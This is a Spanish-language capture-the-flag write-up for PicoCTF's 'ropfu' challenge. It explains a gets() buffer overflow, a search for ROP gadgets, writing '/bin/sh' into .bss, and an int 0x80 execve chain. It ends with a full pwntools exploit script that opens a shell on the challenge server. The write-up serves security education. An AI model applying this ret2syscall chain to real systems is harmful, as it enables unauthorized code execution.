---
description: '#Ret2Syscall'
---

# Ropfu

Bienvenidos al primer ejercicio hard que hago de PicoCTF!

En este caso nos dan un binario y su código:

```c
./vuln
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
Hola
```

El binario simplemente registra un input y se cierra.

Vamos a ver como se recibe este input:

```c
  return gets(buf);
```

El programa no limita el tamaño de nuestro input así que este programa es vulnerable a buffer overflow.

Si miramos sus protecciones podemos ver que PIE no está habilitado pero si que hay un canary:

```c
[*] '/home/ub1cu0/Desktop/picoCTF/ropfu/vuln_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

El binario tiene canary pero en la función vulnerable no parece que se haga ninguna verificación, por lo que no nos afecta en este caso.

Si miramos con el comando `file` podemos ver como el binario está estáticamente enlazado:

```c
file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped
```

Esto quiere decir que el binario tiene gadgets como `int 0x80` del que hablaré mas adelante que no suelen estar en la libc.

Vamos a intentar encontrar el offset hasta la dirección de retorno:

```c
pwn cyclic 30         
aaaabaaacaaadaaaeaaafaaagaaaha

EIP  0x61616168 ('haaa')

cyclic -l haaa

pwndbg> cyclic -l haaa
Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
Found at offset 28 // Offset
```

Vale, ahora que tenemos el offset podemos mandar el programa a donde queramos a voluntad.

En el código no hay ninguna función interesante para llamar. Como no hay PIE tiene toda la pinta que hay que hacer un `ret2syscall`

Para hacer ret2syscall es muy importante saber si el binario es de 32 o 64 bits. En este caso es de 32 bits, y eso cambia bastante las cosas. En 64 bits se suele usar la instrucción `syscall`, pero en 32 bits no existe como tal. En su lugar, se usa el gadget `int 0x80`, que es el equivalente en 32 bits para invocar una syscall.

Ahora que sabemos que tenemos que utilizar `0x80` como lo usamos? `0x80` y `syscall` simplemente llaman al sistema para hacer algo, dependiendo de lo que le pases por rax pueden hacer varias cosas. Lo que nos interesa es cuando le pasamos `11` por rax, ya que con eso le indicamos que queremos hacer un execve, el cual ejecuta un programa.

Cual sería la estructura de lo que tenemos que montar?

Como execve tiene lo siguiente:

```c
execve("/bin/sh", NULL, NULL)
```

Habría que hacer:

1. Poner en EAX el numero 11, esto sirve para que el “syscall” haga un execve
2. Poner en EBX un **PUNTERO** a `/bin/sh`
3. Poner en ECX un nulo (0x0)
4. Poner en EDX un nulo (0x0)
5. Ir a 0x80 para ejecutar la intrucción

Para esto tenemos que ir buscando gadgets donde hayan `pop EAX`, `pop EBX`...etc...e ir colocando cada cosa en su registro correspondiente. Esto lo podemos buscar con ROPGadget de la siguiente manera:

```c
ROPgadget --binary vuln | grep -w "pop eax"
. . .
0x080b073a : pop eax ; ret
. . .
```

Ahora ya tenemos la dirección a un pop para el primer registro. Vamos a ir apuntando todas las direcciones a los gadgets que nos hacen falta:

```c
INT_0x80      = 0x0804a3c2
POP_EAX       = 0x080b073a
POP_ECX       = 0x08049e29
POP_EDX_EBX   = 0x080583b9
```

Yo he hecho una trampita pequeña, he encontrado un gadget que hace un pop `edx; pop ebx; ret` y lo voy a aprovechar para matar a 2 pájaros de un tiro.

Vale, parece que tenemos todo lo que nos hace falta pero nos falta el `/bin/sh`. Aquí se complica el asunto ya que tenemos que pasarle el puntero a donde esté esa cadena. Para complicar mas las cosas como estamos en 32 bits y, como máximo caben 4 bytes por elemento en el stack y en cada registro, no cabría aunque nos dejara poner a secas el string.

Si pensamos un poco se nos puede ocurrir poner `/bin/sh` en el stack al final de nuestro payload y luego buscarlo con el comando `telescope $rsp 20` y apuntarnos la dirección donde empieza. Suena bien, verdad? Si, pero hay un problema, la maquina remota tiene ASLR activado y esto quiere decir que ese puntero del stack va a cambiar en cada ejecución.

Para superar este obstáculo podemos intentar guardar nuestra cadena en la sección .data o .bss del programa, estas secciones de la memoria no cambian con ASLR. Esto se hace de la siguiente manera

Primera tenemos que encontrar la dirección donde empieza alguna de esas secciones de memoria. En este caso voy a utilizar `.bss` pero podéis utilizar la que queráis.

Si hacemos el siguiente comando podemos ver en que dirección empieza cada sección de la memoria del programa:

```c
readelf -S vuln_patched 

There are 29 section headers, starting at offset 0xace68:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
. . .
 4
  [18] .got.plt          PROGBITS        080e5000 09c000 000044 04  WA  0   0  4
  [19] .data             PROGBITS        080e5060 09c060 000ec0 00  WA  0   0 32
  [20] __libc_subfreeres PROGBITS        080e5f20 09cf20 000024 00  WA  0   0  4
  [21] __libc_IO_vtables PROGBITS        080e5f60 09cf60 000354 00  WA  0   0 32
  [22] __libc_atexit     PROGBITS        080e62b4 09d2b4 000004 00  WA  0   0  4
  [23] .bss              NOBITS          080e62c0 09d2b8 000d1c 00  WA  0   0 32
  [24] __libc_freer[...] NOBITS          080e6fdc 09d2b8 000014 00  WA  0   0  4
. . .
```

La primera columna de direcciones es la que tiene la dirección donde empieza la sección.

Ahora que tenemos la dirección tenemos que conseguir colocar `/bin/sh` ahí. Esto se puede hacer con la siguiente regex:

```c
pwndbg> rop --grep 'mov .* \[edx\], eax'c
```

Este regex busca gadgets que mueven algo a algún sitio, con lo cual como tenemos el valor que queremos y la dirección donde la queremos podemos poner esa información en los registros correspondientes y mover `/bin/sh` a `.bss`. En mi caso he elegido este gadget:

```c
0x80590f2 : mov dword ptr [edx], eax ; ret
```

Esto lo que hace es mover lo que esté en `eax` a `edx`. Entonces tenemos que conseguir poner en `eax` `/bin/sh` y en `edx` la dirección que hemos pillado antes del `.bss`.

Podemos meter lo que queramos en variables con el método de antes de encontrar un gadget `pop` y el registro que queramos pero ahora surge un nuevo problema. Recordemos que cada registro, como estamos en un binario de 32 bits solo puede contener un máximo de 4 bytes y `/bin/sh` ocupa mas que eso ya que cada carácter ocupa 1 byte. Para esto podemos partir en 2 nuestra string y ejecutar 2 veces el gadget mov pero la segunda vez añadiéndole un + 4 para mandarlo 4 bytes por encima de la dirección de la primera iteración y hacer que no se pisen.

```python
PART1 = u32(b"/bin")
PART2 = u32(b"/sh\x00")
```

Con esto tendríamos los datos y el conocimiento necesario para montar el payload:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln_patched")
context.binary   = exe
context.terminal = ['kitty']

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        p = process(exe.path)
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote("saturn.picoctf.net", 55177)
    return p

# Datos
OFFSET        = 28                           # distancia hasta EIP
INT_0x80      = 0x0804a3c2                   # int 0x80
POP_EAX       = 0x080b073a                   # pop eax ; ret
POP_ECX       = 0x08049e29                   # pop ecx ; ret
POP_EDX_EBX   = 0x080583b9                   # pop edx ; pop ebx ; ret
MOV_EDX_EAX   = 0x080590f2                   # mov dword ptr [edx], eax ; ret
BSS_ADDR      = 0x080e62c0                   # sección .bss

# "/bin/sh" en 2 partes
PART1 = u32(b"/bin")
PART2 = u32(b"/sh\x00")

payload = flat({
    OFFSET: [
        # Primera Parte de "/bin/sh" en .bss
        POP_EDX_EBX,   BSS_ADDR,       0x41414141,    # pop edx ; pop ebx ; ret
        POP_EAX,       PART1,                          # pop eax ; ret
        MOV_EDX_EAX,                                    # mov dword ptr [edx], eax ; ret

        # Segunda Parte de "/bin/sh" en .bss
        POP_EDX_EBX,   BSS_ADDR + 4,   0x41414141,    # pop edx ; pop ebx ; ret
        POP_EAX,       PART2,                          # pop eax ; ret
        MOV_EDX_EAX,                                    # mov dword ptr [edx], eax ; ret

        # execve
        POP_EAX,       0xb,                            # pop eax ; ret
        POP_ECX,       0x0,                            # pop ecx ; ret
        POP_EDX_EBX,   0x0,            BSS_ADDR,       # pop edx ; pop ebx ; ret
        INT_0x80                                        # int 0x80
    ]
})


def main():
    p = conn()
    log.info(f'Payload length: {len(payload)} bytes')
    p.recvuntil(b'!')
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
```
